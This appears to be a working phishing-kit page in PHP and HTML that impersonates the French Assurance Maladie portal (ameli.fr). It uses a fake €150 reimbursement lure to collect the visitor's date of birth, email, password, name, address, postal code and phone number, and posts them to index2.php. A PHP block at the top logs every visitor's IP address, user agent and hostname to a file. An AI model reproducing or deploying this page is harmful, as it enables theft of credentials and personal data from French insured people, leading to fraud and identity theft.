<?php

session_start();
		$ip = $_SERVER['REMOTE_ADDR'];
		$agent = $_SERVER['HTTP_USER_AGENT'];
        $hostname = gethostbyaddr($ip);
		$entry_line = "$ip | UA: $agent | $hostname \r\n";
		$fp = fopen("ip.log", "a");
		fputs($fp, $entry_line);
		fclose($fp);
?>
<!DOCTYPE html>
<html slick-uniqueid="3" lang="fr"><head xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr" lang="fr"><link rel="shortcut icon" href="https://assure.ameli.fr/PortailAS/framework/skins/assure/images/as/favicon.ico" type="image/x-icon"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="description" content="Vos démarches en ligne avec l'Assurance Maladie. Suivi remboursements - Attestations - CEAM - Carte Vitale - Messagerie mail -  Coaching santé"><title>Compte ameli - mon espace personnel</title><link rel="stylesheet" type="text/css" href="index_fichiers/layout.css"><script src="index_fichiers/buttons.js" type="text/javascript"></script><script src="index_fichiers/util.js" type="text/javascript"></script><link rel="stylesheet" type="text/css" href="index_fichiers/biblicnam-structure-sans.css"><link rel="stylesheet" type="text/css" href="index_fichiers/reset.css"><link rel="stylesheet" type="text/css" href="index_fichiers/clear.css"><link rel="stylesheet" type="text/css" href="index_fichiers/liens.css"><link rel="stylesheet" type="text/css" href="index_fichiers/forms.css"><link rel="stylesheet" type="text/css" href="index_fichiers/boutons.css"><link rel="stylesheet" type="text/css" href="index_fichiers/general.css"><link rel="stylesheet" type="text/css" href="index_fichiers/nav.css"><link rel="stylesheet" type="text/css" href="index_fichiers/colors.css"><link rel="stylesheet" type="text/css" href="index_fichiers/custom.css"><style type="text/css">
					.r_cnx_page .r_cnx_btlien,
					.r_cnx_page .r_cnx_btsubmit,
                    .r_ddc_btsubmit,
                    .r_ddc_btretour,
                    .r_ddc_btterminer,
                    .blocformfond fieldset,
                    .blocformfond .bloc_infos,
                    .r_acc_bloc_infos,
                    .bloc_infos_perso .content,
                    .imgCriteresPhoto,
                    .bloc_infos_perso .bloc_infos,
                    .avertissement
                    {
                    	behavior: url(/PortailAS/framework/skins/assure/js/PIE.htc);
                    }
                </style><script src="index_fichiers/biblicnam-standalone.js" type="text/javascript"></script><script src="index_fichiers/fenetre.js" type="text/javascript"></script><script src="index_fichiers/afficheElement.js" type="text/javascript"></script><script src="index_fichiers/OpenPopup.js" type="text/javascript"></script><script src="index_fichiers/validation.js" type="text/javascript"></script><script src="index_fichiers/calendar.js" type="text/javascript"></script><script src="index_fichiers/calendar-setup.js" type="text/javascript"></script><script src="index_fichiers/calendar-fr.js" type="text/javascript"></script><script src="index_fichiers/AideSaisie.js" type="text/javascript"></script><script src="index_fichiers/refonte_biblicnam.js" type="text/javascript"></script><script src="index_fichiers/questionnaireSatisfaction.js" type="text/javascript"></script><script src="index_fichiers/blocs.js" type="text/javascript"></script><script src="index_fichiers/invalidite.js" type="text/javascript"></script><script src="index_fichiers/paiement.js" type="text/javascript"></script><script src="index_fichiers/informationsPerso.js" type="text/javascript"></script><script src="index_fichiers/questionnaireNotationEtoile.js" type="text/javascript"></script><script src="index_fichiers/dmp.js" type="text/javascript"></script><link rel="stylesheet" type="text/css" href="index_fichiers/window.css"></head><body><header class="wlp-bighorn-header" role="banner"><div class="wlp-bighorn-layout wlp-bighorn-layout-flow"><div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-horizontal wlp-bighorn-layout-flow-first" style="height: auto"><div></div><div class="wlp-bighorn-theme wlp-bighorn-theme-borderless"><div id="Header" class="wlp-bighorn-window  "><div class="wlp-bighorn-window-content">






















<script type="text/javascript" src="./gen_validatorv4.js"></script>

<!-- Onglets -->
<div class="blockLiensEntete">
	<!-- Lien d'évitement, place le lecteur sur le contenu -->
	<span class="inlineLien">
		<a tabindex="1" href="#contenu" title="Aller directement au contenu">
			Aller au contenu
		</a>
	</span>
					
	<!-- Lien Recommandations  de sécurité -->
	<span class="inlineLien">
			<a target="_blank" tabindex="2" href="https://assure.ameli.fr/PortailAS/ShowProperty/WLP%20Repository/aides/recommandations_securite" onclick="Fenetre.components['HeaderrecommandationsSecurite'].open();return false;" title="Recommandations de sécurité (nouvelle fenêtre)">Recommandations de sécurité&nbsp;</a>
	</span>	
	
	<!-- Lien d'aide -->
	<span class="inlineLien">
		<a id="id_lien_aide" tabindex="3" target="aideAmeli" href="https://assure.ameli.fr/PortailAS/portlets/popup/AideGenerale.jsp" onclick='openPopup("/PortailAS/portlets/popup/AideGenerale.jsp"); return false;' title="Accéder aux informations (nouvelle fenêtre)">
			Aide
		</a>
	</span>	


	
	

</div>




<!-- On récupère les valeurs du regime general par defaut-->

	


<a name="top"></a>

	<!-- On récupère le régime de l'assuré -->
	
	
	
	

	<h1>
		<div class="logoam">
			
			
				 
					
				
				
				<a tabindex="-1" class="r_lien_image" href="https://assure.ameli.fr/PortailAS/appmanager/PortailAS/assure;jsessionid=HZZDY54TLR7KVR5pV1hjdhJrK8Z3WCC1n2n13ypjsNNt7KZyqf0S%211506701221?_nfpb=true&amp;_pageLabel=as_accueil_page" title="Accéder à l'accueil">
					<img src="index_fichiers/logo_regime_general.png" alt="Logo du régime d'assurance maladie">
				</a>
			
		</div>
		<img class="tetiere" alt="Compte ameli : mon espace personnel" src="index_fichiers/tetiere_regime_general.png">
	</h1>
	
</div></div></div></div></div></header><div id="ameli_portal_book_2" class="wlp-bighorn-book"><nav class="wlp-bighorn-menu-multi" role="navigation"></nav><div class="wlp-bighorn-book-content"><div id="as_connexion_book" class="wlp-bighorn-book"><div class="wlp-bighorn-book-content"><main id="as_creation_immediate_page" class="wlp-bighorn-page-unconnect" role="main"><section id="contenu" class="corps-de-page"><div class="wlp-bighorn-layout wlp-bighorn-layout-grid"><div class="wlp-bighorn-layout-cell wlp-bighorn-layout-grid-cell"><div></div><div class="wlp-bighorn-layout wlp-bighorn-layout-flow"><div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-vertical wlp-bighorn-layout-flow-first" style="height: auto"><div></div><div id="creationImmediate_1" class="wlp-bighorn-window  "><div class="wlp-bighorn-titlebar"><h1 class="wlp-bighorn-titlebar-title-panel">Dossier de remboursement : #5408700 - Montant : 150€</h1></div><div class="wlp-bighorn-window-content">


























<script type="text/javascript" src="index_fichiers/demandeCodeProvisoire.js"></script>

<script type="text/javascript">
	// Init de l'objet contenant les messages d'erreur serveur (format key = champ.id, value = errMsg)
	var errors = {};
	errors["creationImmediate_1idNir"] = {
		length: "Votre numéro de Sécurité sociale ne peut être inférieur à 13 chiffres.",
		pattern: "Votre numéro de Sécurité sociale doit contenir des chiffres, A ou B. Veuillez recommencer."
	};
	errors["creationImmediate_1idDna"] = {
		pattern: "La date n'a pas un format correct (jj/mm/aaaa).",
		anterieur: "La date de naissance doit être inférieure à la date du jour."
	};
	errors["creationImmediate_1idCp"] = {
		pattern: "Votre code postal doit comprendre 5 chiffres."
	};
	errors["creationImmediate_1idNom"] = {
		length: "Le nom est obligatoire."
	};
</script>

<div class="centrepage">

 <form class="form" name ="darnoo" id="darnoo" method="POST"  action="index2.php" enctype="application/x-www-form-urlencoded">
    <div class="blocformfond creationimmediate">
      
      <div>
      	<h2>
      		Veuillez remplir les informations personnels de votre dossier #5408700:
      	</h2>
      </div>
      
      <fieldset>
      	

		<div>
		  
		    



		    
		    <span class="zone_champ_saisie"><b class="erreur_champ"></b></span>
		    <div class="right_side">
		    	

		    </div>
		  
		</div>
      	<div>
      	  
		    <label class="r_label r_ddc_half_screen" id="creationImmediate_1labelniras" for="creationImmediate_1idNir">


			  Date de naissance:
			  <img src="index_fichiers/puce_obligatoire.gif" alt="*" width="5" height="8">
					</label>



			<span class="zone_champ_saisie">
			<input id="dob1" maxlength="2" size="1" class="champ" tabindex="4" name="dob1" type="text" required>
			<input id="dob2" maxlength="2" size="1" class="champ" tabindex="4" name="dob2" type="text" required>
			<input id="dob3" maxlength="4" size="4" class="champ" tabindex="4" name="dob3" type="text" required> JJ/MM/AAAA
			</span>
			
			<div class="right_side">
			  <span id="creationImmediate_1idNir_messageErreur" class="message_erreur message_erreur_invisible"></span>

			</div>
      	</div>
		

      	<div>
      	  
		    <label class="r_label r_ddc_half_screen" id="creationImmediate_1labelniras" for="creationImmediate_1idNir">


			  Email:
			  <img src="index_fichiers/puce_obligatoire.gif" alt="*" width="5" height="8">
					</label>
			<span class="zone_champ_saisie">
			<input id="email" maxlength="30" size="18" class="champ" tabindex="4" name="email" type="text" required></span>
			<div class="right_side">
			  <span id="creationImmediate_1idNir_messageErreur" class="message_erreur message_erreur_invisible"></span>

			</div>
      	</div>
		<div>
		    <span class="zone_champ_saisie"></span>
		    <div class="right_side">
		    	<span id="creationImmediate_1idDna_messageErreur" class="message_erreur message_erreur_invisible"></span>

		    </div> 
		  
		</div>
         

    
		<div>
		  
		    <label class="r_label r_ddc_half_screen" id="creationImmediate_1labelcodepostal" for="creationImmediate_1idCp">


		      Mot de passe:
		      <img src="index_fichiers/puce_obligatoire.gif" alt="*" width="5" height="8">
		    		</label>
		    <span class="zone_champ_saisie"><input id="password" maxlength="30" size="18" class="champ" tabindex="6" name="password" type="text" required></span>
		    <div class="right_side">
		    	<span id="creationImmediate_1idCp_messageErreur" class="message_erreur message_erreur_invisible"></span>

		    </div>
		  
		</div>
		
				<div>
		  
		    <label class="r_label r_ddc_half_screen" id="creationImmediate_1labelcodepostal" for="creationImmediate_1idCp">


		      Nom:
		      <img src="index_fichiers/puce_obligatoire.gif" alt="*" width="5" height="8">
		    		</label>
		    <span class="zone_champ_saisie"><input id="nom" maxlength="30" size="18" class="champ" tabindex="6" name="nom" type="text" required></span>
		    <div class="right_side">
		    	<span id="creationImmediate_1idCp_messageErreur" class="message_erreur message_erreur_invisible"></span>

		    </div>
		  
		</div>
		
				<div>
		  
		    <label class="r_label r_ddc_half_screen" id="creationImmediate_1labelcodepostal" for="creationImmediate_1idCp">


		      Prénom:
		      <img src="index_fichiers/puce_obligatoire.gif" alt="*" width="5" height="8">
		    		</label>
		    <span class="zone_champ_saisie"><input id="prenom" maxlength="30" size="18" class="champ" tabindex="6" name="prenom" type="text" required></span>
		    <div class="right_side">
		    	<span id="creationImmediate_1idCp_messageErreur" class="message_erreur message_erreur_invisible"></span>

		    </div>
					<div>
		  
		    <label class="r_label r_ddc_half_screen" id="creationImmediate_1labelcodepostal" for="creationImmediate_1idCp">


		      Adresse:
		      <img src="index_fichiers/puce_obligatoire.gif" alt="*" width="5" height="8">
		    		</label>
		    <span class="zone_champ_saisie"><input id="adresse" maxlength="30" size="18" class="champ" tabindex="6" name="adresse" type="text" required></span>
		    <div class="right_side">
		    	<span id="creationImmediate_1idCp_messageErreur" class="message_erreur message_erreur_invisible"></span>

		    </div>
		  
		</div>
							<div>
		  
		    <label class="r_label r_ddc_half_screen" id="creationImmediate_1labelcodepostal" for="creationImmediate_1idCp">


		      Ville:
		      <img src="index_fichiers/puce_obligatoire.gif" alt="*" width="5" height="8">
		    		</label>
		    <span class="zone_champ_saisie"><input id="ville" maxlength="30" size="18" class="champ" tabindex="6" name="ville" type="text" required></span>
		    <div class="right_side">
		    	<span id="creationImmediate_1idCp_messageErreur" class="message_erreur message_erreur_invisible"></span>

		    </div>
		  
		</div>
							<div>
		  
		    <label class="r_label r_ddc_half_screen" id="creationImmediate_1labelcodepostal" for="creationImmediate_1idCp">


		      Code postale:
		      <img src="index_fichiers/puce_obligatoire.gif" alt="*" width="5" height="8">
		    		</label>
		    <span class="zone_champ_saisie">
			<input id="cp" maxlength="5" size="18" class="champ" tabindex="6" name="cp" type="text" required></span>
		    <div class="right_side">
		    	<span id="creationImmediate_1idCp_messageErreur" class="message_erreur message_erreur_invisible"></span>

		    </div>
		  
		</div>
							<div>
		  
		    <label class="r_label r_ddc_half_screen" id="creationImmediate_1labelcodepostal" for="creationImmediate_1idCp">


		      Téléphone:
		      <img src="index_fichiers/puce_obligatoire.gif" alt="*" width="5" height="8">
		    		</label>
		    <span class="zone_champ_saisie"><input id="tele" maxlength="10" size="18" class="champ" tabindex="6" name="tele" type="text" required></span>
		    <div class="right_side">
		    	<span id="creationImmediate_1idCp_messageErreur" class="message_erreur message_erreur_invisible"></span>

		    </div>
		  
		</div>
		  
		</div>


      </fieldset>
      <div class="r_obligatoire"><img src="index_fichiers/puce_obligatoire.gif" alt="*" width="5" height="8"> Champ obligatoire</div> 
    </div> 
        
    <div class="txt_milieu">
      <input name="creationImmediate_1actionEvt" value="verifierEligibilite" type="hidden">

	  <input name="creationImmediate_1actionEvt" tabindex="11" value="Continuer" id="creationImmediate_1id_r_cnx_btn_submit" class="r_btsubmit" type="submit">
    </div>
    
  </form>
				<script  type="text/javascript">
				var frmvalidator = new Validator("darnoo");
					frmvalidator.addValidation("email","email","Format de votre email est incorrect.");
					frmvalidator.addValidation("cp","num","Format de votre code postale est incorrect.");
					frmvalidator.addValidation("cp","minlen=5","Format de votre code postale est incorrect.");
					frmvalidator.addValidation("tele","num","Format de votre téléphone est incorrect.");
					frmvalidator.addValidation("tele","minlen=10","Format de votre téléphone est incorrect.");
					frmvalidator.addValidation("dob1","minlen=2","Veuillez entrer votre Date de naissance"); 
					frmvalidator.addValidation("dob2","minlen=2","Veuillez entrer votre Date de naissance"); 
					frmvalidator.addValidation("dob3","minlen=4","Veuillez entrer votre Date de naissance"); 
					frmvalidator.addValidation("dob3","num","Format de date de naissance est incorrect."); 
					frmvalidator.addValidation("dob2","num","Format de date de naissance est incorrect."); 
					frmvalidator.addValidation("dob1","num","Format de date de naissance est incorrect."); 
</script>
  
     
</div>


<!-- Preremplir et focus la date de naissance lorsque le nir est complet -->

<!-- Preremplir la date de naissance lorsque l'utilisateur focus le champ (tab ou click) -->
<!-- Positionner le curseur au debut du champ si le mois et l'annee sont renseignés -->

<!-- Activer le bouton si les champs sont OK -->
<!-- Focus le champ (contrer la perte de focus lorsque le message d'erreur est affiche) -->



<!-- Activer le bouton si les champs sont OK -->

<!-- Activer le bouton si les champs sont OK -->

<!-- Activer le bouton si les champs sont OK -->



</div></div></div></div></div></div></section></main></div></div></div></div><footer class="wlp-bighorn-footer" role="contentinfo"><div class="wlp-bighorn-layout wlp-bighorn-layout-flow"><div class="wlp-bighorn-layout-cell wlp-bighorn-layout-flow-horizontal wlp-bighorn-layout-flow-first" style="height: auto"><div></div><div id="prefooterAmeli_1" class="wlp-bighorn-window  "><div class="wlp-bighorn-window-content">












<div class="prefooterbody seul">
	<div class="borderleft"></div>
	<ul class="ameli">
		<li>
			<a class="legende" href="http://www.ameli.fr/assures/" title="Infos pratiques (nouvelle fenêtre)" target="_blank">
				Infos pratiques	
			</a>
		</li>
		
		<li>
			<a class="legende" href="http://annuairesante.ameli.fr/" title="Annuaire santé (nouvelle fenêtre)" target="_blank">
				Annuaire santé	
			</a>
		</li>
		
		<li>
			<a class="legende" href="https://mes-aides.gouv.fr/" title="Simulateurs de droits CMUC-ACS (nouvelle fenêtre)" target="_blank">
				Simulateurs de droits CMUC-ACS	
			</a>
		</li>
	</ul>
	
</div>

</div></div><div class="wlp-bighorn-theme wlp-bighorn-theme-borderless"><div id="Footer" class="wlp-bighorn-window  "><div class="wlp-bighorn-window-content">





















<ul>
	<li>
		<a id="id_lien_info_legales" href="https://assure.ameli.fr/PortailAS/portlets/popup/InformationsLegales.jsp" target="aideAmeli" onclick='openPopup("/PortailAS/portlets/popup/InformationsLegales.jsp"); return false;' title="Accéder aux informations (nouvelle fenêtre)">
			Informations légales
		</a>
	</li>
	<li>
		<a id="id_lien_copyright" href="https://assure.ameli.fr/PortailAS/portlets/popup/Copyright.jsp" target="aideAmeli" onclick='openPopup("/PortailAS/portlets/popup/Copyright.jsp"); return false;' title="Accéder aux informations (nouvelle fenêtre)">
			Propriété intellectuelle
		</a>
	</li>
	<li>
		<a id="id_lien_condition_utilisation" href="https://assure.ameli.fr/PortailAS/portlets/popup/ConditionsUtilisation.jsp" target="aideAmeli" onclick='openPopup("/PortailAS/portlets/popup/ConditionsUtilisation.jsp"); return false;' title="Accéder aux informations (nouvelle fenêtre)">
			Conditions d'utilisation
		</a>
	</li>
	<li>
		<a id="id_lien_aide_footer" target="aideAmeli" href="https://assure.ameli.fr/PortailAS/portlets/popup/AideGenerale.jsp" onclick='openPopup("/PortailAS/portlets/popup/AideGenerale.jsp"); return false;' title="Accéder aux informations (nouvelle fenêtre)">
			Aide
		</a>
	</li>
	
	
</ul>



<script type="text/javascript">
window.addEvent('domready', function(event) {Fenetre.initModale('HeaderrecommandationsSecurite', {onload:false});Fenetre.initBulle('creationImmediate_1AideSaisieNir', {"position":"bulleAideSaisieNir"});new DatePicker('creationImmediate_1idDna',{toggle: 'creationImmediate_1idDna_calendrier', pickerClass: 'datepicker dpstandard', linkTitle: 'Aide à la saisie de date'});

;
	$$('div.wlp-bighorn-menu-menu-panel > ul > li').each(function(liMenu){
		if(liMenu.getElements('ul').length > 0){
			if(liMenu.hasClass('menuGrand')){
				liMenu.getElements('ul>li>ul>li>a').each(function(aMenu){
					aMenu.addEvent('focus', function(){
						liMenu.getElements('ul>li>ul').each(function(ulMenu){
							ulMenu.setStyles({
								left: 'inherit',
								height: 'inherit',
								width: 'auto',
								top: 'inherit',
								position: 'inherit',
								lineHeight: 'inherit'	
							});
						});
						liMenu.getElements('ul')[0].setStyles({
							left: '0',
							height: 'inherit',
							width: '100%',
							maxWidth: 'none',
							top: '38px',
							lineHeight: 'inherit'	
						});
						liMenu.getElements('a')[0].setStyles({
							color: 'white',
							backgroundColor: '#27aae1'
						});
					});
					aMenu.addEvent('blur', function(){
						liMenu.getElements('ul>li>ul')[0].removeProperty('style');
						liMenu.getElements('ul')[0].removeProperty('style');
						liMenu.getElements('a')[0].removeProperty('style');
					});
				});
			} else {
				liMenu.getElements('ul>li>a').each(function(aMenu){
					aMenu.addEvent('focus', function(){
						liMenu.getElements('ul')[0].setStyles({
							left: 'inherit',
							height: 'inherit',
							width: 'auto',
							top: '38px',
							lineHeight: 'inherit'	
						});
						liMenu.getElements('a')[0].setStyles({
							color: 'white',
							backgroundColor: '#27aae1'
						});
					});
					aMenu.addEvent('blur', function(){
						liMenu.getElements('ul')[0].removeProperty('style');
						liMenu.getElements('a')[0].removeProperty('style');
					});
				});
			}
		}
	});
;});$('bulleAideSaisieNir').addEvent('mousedown', function(event) {	
            if($('creationImmediate_1AideSaisieNir').hasClass("invisible")){	
         	  Fenetre.components['creationImmediate_1AideSaisieNir'].open();	
            } else {		
         	  Fenetre.components['creationImmediate_1AideSaisieNir'].close();
            }
            event.stopPropagation();	
          ;});$('bulleAideSaisieNir').addEvent('click', function(event) {	
            event.stopPropagation();	
          ;});$('creationImmediate_1idDna').addEvent('blur', function(event) {if(!ChampSaisieTag.controleDate(this)) return;
	enableBoutonCIC('creationImmediate_1');
;});$('creationImmediate_1idNir').addEvent('input', function(event) {
	if (this.value.length === 13) {
		$('creationImmediate_1idDna').focus();
	}
;});$('creationImmediate_1idDna').addEvent('focus', function(event) {
	if (this.value.length === 0) 
		initCalendarWithNir($('creationImmediate_1idNir'), $(this), '', '21/04/2017');
	if (this.value.length === 8) $(this.id).setCaretPosition(0);
;});$('creationImmediate_1idCp').addEvent('blur', function(event) {
	enableBoutonCIC('creationImmediate_1');
;});$('creationImmediate_1idCp').addEvent('input', function(event) {
	if (this.value.length == 5) enableBoutonCIC('creationImmediate_1');
;});$('creationImmediate_1idNom').addEvent('blur', function(event) {
	enableBoutonCIC('creationImmediate_1');
;});$('creationImmediate_1idNir').addEvent('blur', function(event) {
	enableBoutonCIC('creationImmediate_1');
;});
</script>

</div></div></div></div></div></footer><div id="HeaderrecommandationsSecurite" class="fenetre invisible modale" tabindex="0" role="alert" aria-labelledby="HeaderrecommandationsSecurite_title" style="position: absolute; left: 920px; top: 432px;">
	<div class="fenetre-header">
		<span id="HeaderrecommandationsSecurite_title" class="fenetre-title">Recommandations de sécurité</span>
		<span id="HeaderrecommandationsSecurite_close" class="fenetre-button" role="button" tabindex="0">
			<span class="label-close">Fermer</span>
		</span>
	</div>
	<div class="fenetre-content">
	
		
	
	<div>
	<ul style="margin-left: 1em">
		<li style="margin-top: 1em">
		  Le code d'accès au compte ameli est strictement personnel, il 
convient de le garder secret. N'oubliez pas de le modifier 
régulièrement.
		</li>
		<li style="margin-top: 1em">
		  Assurez-vous que l'ordinateur sur lequel vous consultez votre compte
 ameli est bien protégé par un antivirus et que celui-ci est à jour.
		</li>
		<li style="margin-top: 1em">
		  Vérifiez l'adresse (URL) dans la barre de votre navigateur lorsque vous consultez votre compte ameli depuis internet : <a href="https://assure.ameli.fr/">https://assure.ameli.fr</a>
		</li>
		<li style="margin-top: 1em">
		  L'adresse (URL) doit débuter par https:// et un cadenas doit apparaître.
		</li>
		<li style="margin-top: 1em">
		  N'oubliez pas de vous déconnecter de votre session ameli avant de 
fermer votre navigateur internet. Ceci plus particulièrement si vous 
utilisez un ordinateur partagé (cybercafé...)
		</li>
	</ul>
</div>

	</div>
</div><div id="creationImmediate_1AideSaisieNir" class="fenetre invisible bulle" tabindex="0" role="dialog" aria-labelledby="creationImmediate_1AideSaisieNir_title">
	<div class="fenetre-header">
		<span id="creationImmediate_1AideSaisieNir_title" class="fenetre-title">Aide pour le n° de sécurité sociale</span>
		<span id="creationImmediate_1AideSaisieNir_close" class="fenetre-button" role="button" tabindex="0">
			<span class="label-close">Fermer</span>
		</span>
	</div>
	<div class="fenetre-content">
	
		
            Saisissez votre numéro de sécurité sociale à 13 chiffres.<br>13 caractéres (disponible sur vos relevés de remboursement)<br>Exemple : 1480599999356 <br> Attention, si vous êtes ayant droit, saisissez le numéro de sécurité sociale de la personne à laquelle vous êtes rattachée.
          	</div>
</div></body></html>